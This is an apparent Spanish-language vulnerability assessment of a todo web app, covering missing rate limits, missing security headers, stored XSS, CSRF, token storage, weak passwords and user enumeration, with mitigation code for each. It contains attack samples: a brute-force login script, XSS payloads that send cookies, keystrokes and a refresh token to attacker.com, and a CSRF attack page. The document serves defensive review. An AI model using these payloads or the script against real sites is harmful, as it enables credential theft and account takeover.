# 🚨 VULNERABILITIES.md - Análisis de Vulnerabilidades

## Índice
- [Resumen Ejecutivo](#resumen-ejecutivo)
- [Vulnerabilidades Identificadas](#vulnerabilidades-identificadas)
- [Matriz de Riesgos](#matriz-de-riesgos)
- [Plan de Remediación](#plan-de-remediación)

---

## 📊 Resumen Ejecutivo

Este documento identifica y documenta vulnerabilidades de seguridad en la aplicación, junto con pruebas de concepto (PoC) y estrategias de mitigación.

### Estadísticas

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 **Crítica** | 0 | - |
| 🟠 **Alta** | 2 | Pendiente |
| 🟡 **Media** | 3 | Pendiente |
| 🔵 **Baja** | 2 | Planificado |
| **TOTAL** | **7** | - |

### CVSS Score Promedio: **5.8** (Media)

---

## 🚨 Vulnerabilidades Identificadas

### 1. Ausencia de Rate Limiting - Brute Force Attack

**CVSS Score:** 7.5 (Alta)  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**OWASP:** A07:2021 - Identification and Authentication Failures

#### 📋 Descripción

La aplicación no implementa rate limiting en ningún endpoint, permitiendo ataques de fuerza bruta ilimitados contra el endpoint de login.

#### 🎯 Impacto

- **Confidencialidad**: Alta - Un atacante puede adivinar credenciales
- **Integridad**: Baja - No hay modificación directa de datos
- **Disponibilidad**: Media - Posible DoS por sobrecarga

#### 🔍 Proof of Concept (PoC)

```bash
#!/bin/bash
# Script de ataque de fuerza bruta sin restricciones

USERS_FILE="usernames.txt"
PASSWORDS_FILE="passwords.txt"
URL="http://localhost:5000/api/login"

while IFS= read -r username; do
    while IFS= read -r password; do
        echo "Probando: $username:$password"
        
        response=$(curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$username\",\"password\":\"$password\"}" \
            -w "%{http_code}")
        
        if [[ $response == *"200"* ]]; then
            echo "✅ CREDENCIALES ENCONTRADAS: $username:$password"
            exit 0
        fi
        
        # Sin rate limit, podemos hacer requests ilimitados
        # No hay delay necesario
        
    done < "$PASSWORDS_FILE"
done < "$USERS_FILE"
```

**Resultado esperado:**
- ✅ Requests ilimitados sin bloqueo
- ✅ Sin CAPTCHA después de intentos fallidos
- ✅ Sin lockout temporal de cuenta

#### 🛡️ Mitigación Recomendada

**Implementación con express-rate-limit:**

```javascript
// backend/middleware/rateLimiter.js
const rateLimit = require('express-rate-limit');

// Rate limiter para login
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // 5 intentos por ventana
    message: {
        error: "Demasiados intentos de inicio de sesión. Intenta de nuevo en 15 minutos."
    },
    standardHeaders: true,
    legacyHeaders: false,
    // Usar IP + User-Agent para identificación
    keyGenerator: (req) => {
        return req.ip + req.headers['user-agent'];
    }
});

// Rate limiter para signup
const signupLimiter = rateLimit({
    windowMs: 60 * 60 * 1000, // 1 hora
    max: 3, // 3 registros por hora
    message: {
        error: "Demasiados registros desde esta IP."
    }
});

// Rate limiter general para API
const apiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minuto
    max: 100, // 100 requests por minuto
    message: {
        error: "Demasiadas peticiones. Intenta de nuevo más tarde."
    }
});

module.exports = { loginLimiter, signupLimiter, apiLimiter };
```

**Uso:**
```javascript
// backend/app.js
const { loginLimiter, signupLimiter, apiLimiter } = require('./middleware/rateLimiter');

// Aplicar limiters específicos
app.use('/api/login', loginLimiter);
app.use('/api/signup', signupLimiter);

// Limiter general para toda la API
app.use('/api/', apiLimiter);
```

**Configuración adicional con Redis (para clusters):**
```javascript
const RedisStore = require('rate-limit-redis');
const redis = require('redis');

const redisClient = redis.createClient({
    host: process.env.REDIS_HOST,
    port: process.env.REDIS_PORT
});

const loginLimiter = rateLimit({
    store: new RedisStore({
        client: redisClient,
        prefix: 'login_limit:'
    }),
    windowMs: 15 * 60 * 1000,
    max: 5
});
```

#### ✅ Verificación de Mitigación

```bash
# Test: 6 intentos en 1 minuto (debe bloquear después del 5to)
for i in {1..6}; do
    echo "Intento $i:"
    curl -X POST http://localhost:5000/api/login \
        -H "Content-Type: application/json" \
        -d '{"username":"test","password":"wrong"}' \
        -w "\nStatus: %{http_code}\n\n"
    sleep 1
done

# Esperado:
# Intentos 1-5: 400 (credenciales incorrectas)
# Intento 6: 429 (Too Many Requests)
```

---

### 2. Ausencia de Headers de Seguridad

**CVSS Score:** 6.5 (Media)  
**CWE:** CWE-16 (Configuration)  
**OWASP:** A05:2021 - Security Misconfiguration

#### 📋 Descripción

La aplicación no implementa headers de seguridad HTTP, dejándola vulnerable a ataques XSS, clickjacking, MIME sniffing, etc.

#### 🔍 Estado Actual

```bash
# Analizar headers actuales
curl -I http://localhost:5000/api/user \
    -H "Authorization: Bearer TOKEN"

# Respuesta actual (headers faltantes):
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 123
Date: Mon, 17 Feb 2025 10:00:00 GMT
Connection: keep-alive

# ❌ Sin X-Content-Type-Options
# ❌ Sin X-Frame-Options
# ❌ Sin X-XSS-Protection
# ❌ Sin Content-Security-Policy
# ❌ Sin Strict-Transport-Security
```

#### 🎯 Impacto por Header Faltante

| Header | Vulnerabilidad | Impacto |
|--------|----------------|---------|
| **Content-Security-Policy** | XSS, Data Injection | Alto |
| **X-Frame-Options** | Clickjacking | Medio |
| **X-Content-Type-Options** | MIME Sniffing | Bajo |
| **Strict-Transport-Security** | Man-in-the-Middle | Alto (HTTPS) |
| **X-XSS-Protection** | XSS (legacy) | Bajo |
| **Referrer-Policy** | Information Leakage | Bajo |

#### 🛡️ Mitigación Recomendada

```javascript
// backend/app.js
const helmet = require('helmet');

// Configuración completa de Helmet
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"], // Temporal, mejorar con nonces
            scriptSrc: ["'self'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    hsts: {
        maxAge: 31536000, // 1 año
        includeSubDomains: true,
        preload: true
    },
    frameguard: {
        action: 'deny' // Previene clickjacking
    },
    noSniff: true, // X-Content-Type-Options: nosniff
    xssFilter: true, // X-XSS-Protection: 1; mode=block
    referrerPolicy: {
        policy: 'strict-origin-when-cross-origin'
    }
}));
```

#### ✅ Verificación de Mitigación

```bash
# Verificar headers después de implementar Helmet
curl -I http://localhost:5000/api/user \
    -H "Authorization: Bearer TOKEN"

# Esperado:
# ✅ Content-Security-Policy: default-src 'self'
# ✅ X-Frame-Options: DENY
# ✅ X-Content-Type-Options: nosniff
# ✅ X-XSS-Protection: 1; mode=block
# ✅ Strict-Transport-Security: max-age=31536000; includeSubDomains
# ✅ Referrer-Policy: strict-origin-when-cross-origin
```

---

### 3. Cross-Site Scripting (XSS) - Stored

**CVSS Score:** 6.1 (Media)  
**CWE:** CWE-79 (Improper Neutralization of Input)  
**OWASP:** A03:2021 - Injection

#### 📋 Descripción

Los inputs del usuario (específicamente el campo `title` de tareas) no son sanitizados antes de almacenarse en la base de datos ni antes de renderizarse en el frontend, permitiendo ataques XSS almacenados.

#### 🔍 Proof of Concept (PoC)

```javascript
// Frontend - dashboard.jsx (VULNERABLE)
<span className="todo-title">{todo.title}</span>
// Si todo.title = "<img src=x onerror=alert('XSS')>"
// Se ejecutará el script
```

**Ataque paso a paso:**

1. **Crear tarea maliciosa:**
```bash
curl -X POST http://localhost:5000/api/todos \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"title":"<img src=x onerror=alert(document.cookie)>"}'
```

2. **Cuando cualquier usuario vea el dashboard:**
```javascript
// El código malicioso se ejecuta:
<span className="todo-title">
    <img src=x onerror=alert(document.cookie)>
</span>

// Resultado: 
// - Alert con las cookies del usuario
// - Posible robo de access token si estuviera en cookies
```

**Payloads de prueba:**
```html
<!-- Alerta simple -->
<script>alert('XSS')</script>

<!-- Robo de cookies -->
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">

<!-- Redirección maliciosa -->
<img src=x onerror="window.location='https://phishing-site.com'">

<!-- Keylogger -->
<img src=x onerror="document.onkeypress=function(e){fetch('https://attacker.com?k='+e.key)}">
```

#### 🎯 Impacto

- **Robo de sesión**: Si access token estuviera en cookies (actualmente no aplica)
- **Phishing**: Redirigir a sitios maliciosos
- **Defacement**: Modificar apariencia de la página
- **Keylogging**: Capturar inputs del usuario

#### 🛡️ Mitigación Recomendada

**Opción 1: Sanitización en Backend (Recomendado)**

```javascript
// backend/routes/todos.js
const validator = require('validator');

router.post("/", async (req, res) => {
    if (!req.body.title) {
        return res.status(400).json({error: "El título es requerido"});
    }
    
    // Sanitizar input
    const sanitizedTitle = validator.escape(req.body.title);
    
    const todo = new Todo({
        title: sanitizedTitle,
        completed: false,
        idUser: req.user.id,
    });
    
    const newTodo = await todo.save();
    res.status(201).json(newTodo);
});
```

**Opción 2: Sanitización en Frontend**

```javascript
// frontend/utils/sanitizer.js
import DOMPurify from 'dompurify';

export function sanitizeInput(input) {
    return DOMPurify.sanitize(input, {
        ALLOWED_TAGS: [], // No permitir HTML
        ALLOWED_ATTR: []
    });
}

// Uso en dashboard.jsx
import { sanitizeInput } from '../utils/sanitizer';

async function createTodo() {
    const sanitizedTitle = sanitizeInput(title);
    
    const response = await fetch(`${API_URL}/todos`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${auth.getAccessToken()}`,
        },
        body: JSON.stringify({ title: sanitizedTitle }),
    });
}
```

**Opción 3: Renderizado Seguro (React lo hace por defecto)**

```javascript
// React ya escapa automáticamente en {}
// Pero podemos asegurar con DOMPurify:

import DOMPurify from 'dompurify';

<span className="todo-title">
    {DOMPurify.sanitize(todo.title, {ALLOWED_TAGS: []})}
</span>

// O usar dangerouslySetInnerHTML SOLO con sanitización:
<span 
    className="todo-title"
    dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(todo.title)
    }}
/>
```

#### 📚 Defensa en Profundidad

```javascript
// 1. Validación en frontend
const title = sanitizeInput(userInput);

// 2. Sanitización en backend
const cleanTitle = validator.escape(req.body.title);

// 3. Content Security Policy (Helmet)
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"], // Bloquea inline scripts
    }
}));

// 4. Renderizado seguro en React (automático con {})
<span>{todo.title}</span>
```

#### ✅ Verificación de Mitigación

```bash
# Test 1: Intentar crear tarea con script
curl -X POST http://localhost:5000/api/todos \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"title":"<script>alert(1)</script>"}'

# Esperado en BD:
# title: "&lt;script&gt;alert(1)&lt;/script&gt;"
# (HTML escapado, no ejecutable)

# Test 2: Verificar renderizado
# En el navegador, inspeccionar:
<span class="todo-title">
    &lt;script&gt;alert(1)&lt;/script&gt;
</span>
# ✅ No se ejecuta el script
```

---

### 4. Cross-Site Request Forgery (CSRF)

**CVSS Score:** 5.4 (Media)  
**CWE:** CWE-352  
**OWASP:** A01:2021 - Broken Access Control

#### 📋 Descripción

La aplicación no implementa protección CSRF, permitiendo que sitios maliciosos ejecuten acciones en nombre de usuarios autenticados.

#### 🔍 Proof of Concept (PoC)

**Sitio malicioso (attacker.com):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Gana un iPhone Gratis!</title>
</head>
<body>
    <h1>Felicidades! Haz click para reclamar tu premio</h1>
    
    <!-- Formulario oculto que ejecuta acción maliciosa -->
    <form id="csrf-form" action="http://localhost:5000/api/todos" method="POST">
        <input type="hidden" name="title" value="Tarea maliciosa creada sin tu conocimiento">
    </form>
    
    <script>
        // Auto-submit cuando el usuario hace click
        document.getElementById('csrf-form').submit();
        
        // O usando fetch (si el servidor acepta JSON desde otros orígenes)
        fetch('http://localhost:5000/api/todos', {
            method: 'POST',
            credentials: 'include', // Envía cookies (si las hubiera)
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + localStorage.getItem('token') // ⚠️ No funciona cross-origin
            },
            body: JSON.stringify({
                title: 'Tarea maliciosa'
            })
        });
    </script>
</body>
</html>
```

**Escenario de ataque:**
1. Usuario autenticado en `localhost:5000`
2. Usuario visita `attacker.com`
3. `attacker.com` envía request a `localhost:5000` usando las credenciales del usuario
4. Acción maliciosa ejecutada (crear tarea, eliminar cuenta, etc.)

#### 🎯 Impacto Actual

**Severidad reducida** porque:
- ✅ Tokens JWT en Authorization header (no en cookies)
- ✅ JavaScript no puede leer tokens cross-origin

**Pero vulnerable si:**
- ❌ Se migran refresh tokens a cookies (sin SameSite)
- ❌ Se usan cookies de sesión en lugar de JWT

#### 🛡️ Mitigación Recomendada

**Opción 1: CSRF Tokens (Tradicional)**

```javascript
// backend/middleware/csrf.js
const csrf = require('csurf');

const csrfProtection = csrf({
    cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict'
    }
});

module.exports = csrfProtection;
```

```javascript
// backend/routes/todos.js
const csrfProtection = require('../middleware/csrf');

router.post("/", csrfProtection, async (req, res) => {
    // Validar token CSRF (automático con middleware)
    // ...
});

// Endpoint para obtener token
router.get("/csrf-token", csrfProtection, (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});
```

```javascript
// frontend - Obtener y usar token
async function getCsrfToken() {
    const response = await fetch(`${API_URL}/csrf-token`);
    const data = await response.json();
    return data.csrfToken;
}

async function createTodo() {
    const csrfToken = await getCsrfToken();
    
    const response = await fetch(`${API_URL}/todos`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${auth.getAccessToken()}`,
            "CSRF-Token": csrfToken // ← Agregar token
        },
        body: JSON.stringify({ title }),
    });
}
```

**Opción 2: SameSite Cookies (Más Simple)**

```javascript
// Si usamos cookies para refresh tokens
res.cookie('refreshToken', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict', // ← Previene CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000
});
```

**Opción 3: Custom Header Verification**

```javascript
// backend/middleware/csrfProtection.js
function customHeaderCSRF(req, res, next) {
    // Verificar que viene de nuestro frontend
    const customHeader = req.headers['x-requested-with'];
    
    if (customHeader !== 'XMLHttpRequest') {
        return res.status(403).json({error: "Forbidden"});
    }
    
    next();
}

// frontend - Agregar header en todos los requests
fetch(url, {
    headers: {
        'X-Requested-With': 'XMLHttpRequest'
    }
});
```

---

### 5. Refresh Token en localStorage (XSS Risk)

**CVSS Score:** 4.3 (Media)  
**CWE:** CWE-522 (Insufficiently Protected Credentials)  
**OWASP:** A07:2021 - Identification and Authentication Failures

#### 📋 Descripción

El refresh token se almacena en `localStorage`, haciéndolo accesible desde JavaScript y vulnerable a ataques XSS.

#### 🔍 Código Vulnerable

```javascript
// frontend/auth/AuthProvider.jsx
function saveSessionInfo(userInfo, accessToken, refreshToken) {
    setAccessToken(accessToken);  // ✅ En memoria (seguro)
    localStorage.setItem("token", JSON.stringify(refreshToken)); // ❌ Vulnerable a XSS
    setIsAuthenticated(true);
    setUser(userInfo);
}
```

#### 🎯 Escenario de Ataque

Si existe una vulnerabilidad XSS (ver vulnerabilidad #3):

```javascript
// Payload XSS que roba refresh token
<img src=x onerror="
    var token = localStorage.getItem('token');
    fetch('https://attacker.com/steal?token=' + token);
">
```

**Impacto:**
- Atacante obtiene refresh token de 7 días
- Puede generar nuevos access tokens
- Acceso persistente a la cuenta

#### 🛡️ Mitigación Recomendada

**Migrar a HttpOnly Cookies:**

```javascript
// backend/routes/login.js
router.post("/", async (req, res) => {
    const {username, password} = req.body;
    
    const user = await User.findOne({username});
    if (user && await user.comparePassword(password)) {
        const accessToken = user.createAccessToken();
        const refreshToken = await user.createRefreshToken();
        
        // ✅ Enviar refresh token en HttpOnly cookie
        res.cookie('refreshToken', refreshToken, {
            httpOnly: true,      // No accesible desde JavaScript
            secure: true,        // Solo HTTPS
            sameSite: 'strict',  // Protección CSRF
            maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
            path: '/api/refresh-token' // Solo disponible en endpoint de refresh
        });
        
        // Enviar solo access token en JSON
        res.status(200).json(jsonResponse(200, {
            user: getUserInfo(user),
            accessToken
            // NO enviar refreshToken
        }));
    }
});
```

```javascript
// backend/routes/refreshToken.js
router.post("/", async (req, res) => {
    // Leer refresh token desde cookie (no desde header)
    const refreshToken = req.cookies.refreshToken;
    
    if (!refreshToken) {
        return res.status(401).json({error: "No refresh token"});
    }
    
    const found = await Token.findOne({token: refreshToken});
    if (!found) {
        return res.status(401).json({error: "Invalid token"});
    }
    
    const payload = verifyRefreshToken(found.token);
    if (payload) {
        const accessToken = generateAccessToken(payload.user);
        
        // Opcional: Rotar refresh token
        const newRefreshToken = await user.createRefreshToken();
        await Token.deleteOne({token: refreshToken});
        
        res.cookie('refreshToken', newRefreshToken, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict',
            maxAge: 7 * 24 * 60 * 60 * 1000
        });
        
        return res.status(200).json({accessToken});
    }
});
```

```javascript
// frontend/auth/AuthProvider.jsx
function saveSessionInfo(userInfo, accessToken) {
    setAccessToken(accessToken);
    // ❌ Ya no guardar refresh token
    // localStorage.setItem("token", JSON.stringify(refreshToken));
    setIsAuthenticated(true);
    setUser(userInfo);
}

async function requestNewAccessToken() {
    // El refresh token se envía automáticamente en la cookie
    const response = await fetch(`${API_URL}/refresh-token`, {
        method: "POST",
        credentials: 'include' // ← Importante: enviar cookies
    });
    
    if (response.ok) {
        const json = await response.json();
        return json.accessToken;
    }
    return null;
}
```

**Ventajas:**
- ✅ Refresh token no accesible desde JavaScript (inmune a XSS)
- ✅ Protección CSRF con SameSite
- ✅ Transmisión segura con Secure flag (HTTPS)

---

### 6. Falta de Validación de Contraseña

**CVSS Score:** 4.0 (Media-Baja)  
**CWE:** CWE-521 (Weak Password Requirements)  
**OWASP:** A07:2021 - Identification and Authentication Failures

#### 📋 Descripción

No hay validación de complejidad de contraseñas, permitiendo contraseñas débiles como "123", "password", etc.

#### 🔍 Estado Actual

```javascript
// backend/routes/signup.js
// ❌ Solo valida que exista, no su fortaleza
if (!password) {
    return res.status(400).json({error: "Field are required"});
}

// Acepta cualquier contraseña:
// "1" ✅
// "a" ✅
// "password" ✅
```

#### 🛡️ Mitigación

Ver recomendaciones completas en [SECURITY.md - Sección Bcrypt](./SECURITY.md#2-bcrypt---hashing-de-contraseñas)

---

### 7. User Enumeration en Login

**CVSS Score:** 3.5 (Baja)  
**CWE:** CWE-204 (Observable Response Discrepancy)  
**OWASP:** A01:2021 - Broken Access Control

#### 📋 Descripción

El endpoint de login revela si un usuario existe o no mediante mensajes de error diferenciados.

#### 🔍 Código Vulnerable

```javascript
// backend/routes/login.js
const user = await User.findOne({username});
if (user) {
    const correctPassword = await user.comparePassword(password);
    if (correctPassword) {
        // Login exitoso
    } else {
        res.status(400).json({error: "User or password is incorrect"}); // ✅ Genérico
    }
} else {
    res.status(400).json({error: "User not found"}); // ❌ Revela que usuario no existe
}
```

#### 🎯 Impacto

- Permite enumerar usuarios válidos
- Facilita ataques de fuerza bruta dirigidos
- Información útil para ingeniería social

#### 🛡️ Mitigación

```javascript
// Siempre retornar el mismo mensaje
router.post("/", async (req, res) => {
    const {username, password} = req.body;
    
    const user = await User.findOne({username});
    
    // Siempre hashear para evitar timing attack
    if (!user) {
        await bcrypt.hash(password, 10); // Simular verificación
        return res.status(401).json({
            error: "Invalid credentials" // ✅ Mensaje genérico
        });
    }
    
    const correctPassword = await user.comparePassword(password);
    if (!correctPassword) {
        return res.status(401).json({
            error: "Invalid credentials" // ✅ Mismo mensaje
        });
    }
    
    // Login exitoso
});
```

---

## 📊 Matriz de Riesgos

| ID | Vulnerabilidad | CVSS | Probabilidad | Impacto | Prioridad |
|----|---------------|------|--------------|---------|-----------|
| 1 | Sin Rate Limiting | 7.5 | Alta | Alto | 🔴 P1 |
| 2 | Sin Security Headers | 6.5 | Alta | Medio | 🟠 P1 |
| 3 | XSS Stored | 6.1 | Media | Alto | 🟡 P2 |
| 4 | CSRF | 5.4 | Baja | Medio | 🟡 P2 |
| 5 | Refresh Token en localStorage | 4.3 | Media | Bajo | 🟡 P3 |
| 6 | Contraseñas Débiles | 4.0 | Alta | Bajo | 🔵 P3 |
| 7 | User Enumeration | 3.5 | Baja | Bajo | 🔵 P4 |

---

## 🚀 Plan de Remediación

### Sprint 1 (Semana 1-2) - Alta Prioridad

- [ ] **#1 Rate Limiting** - Implementar express-rate-limit
- [ ] **#2 Security Headers** - Configurar Helmet.js
- [ ] **#3 XSS** - Sanitización con validator + DOMPurify

**Esfuerzo estimado:** 8-12 horas  
**Reducción de riesgo:** 70%

### Sprint 2 (Semana 3-4) - Media Prioridad

- [ ] **#4 CSRF** - Tokens CSRF o SameSite cookies
- [ ] **#5 Refresh Token** - Migrar a HttpOnly cookies
- [ ] **#6 Validación de Contraseñas** - Joi/Zod schemas

**Esfuerzo estimado:** 12-16 horas  
**Reducción de riesgo:** 25%

### Sprint 3 (Semana 5-6) - Baja Prioridad

- [ ] **#7 User Enumeration** - Mensajes de error genéricos
- [ ] Testing automatizado de seguridad
- [ ] Documentación de threat model

**Esfuerzo estimado:** 6-8 horas  
**Reducción de riesgo:** 5%

---

## 📚 Referencias

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

---

**Última actualización:** Febrero 2025  
**Próxima revisión:** Marzo 2025
